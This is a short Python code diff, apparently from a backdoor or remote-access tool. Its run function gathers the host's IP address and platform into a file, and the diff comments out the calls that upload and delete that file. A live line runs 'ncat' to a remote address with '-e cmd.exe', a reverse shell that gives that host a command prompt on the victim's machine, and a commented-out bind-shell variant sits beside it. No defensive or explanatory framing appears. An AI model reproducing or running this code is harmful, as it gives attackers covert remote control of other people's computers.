@@ -51,9 +51,10 @@ def run(token):
         stmnt= 'Info: '+ IPAddr+' Sysyem:'+sysconfig.get_platform()+'\n'
         print("text stmnt: "+ stmnt)
         create_file(fname,stmnt)
-        update_file(token,fname)
-        delete_file(fname)
+        #pdate_file(token,fname)
+        #delete_file(fname)
         
         #os.system('ncat -lvp 734 -e cmd.exe')
+        
         os.system('ncat '+ iph +' 734 -e cmd.exe')
     
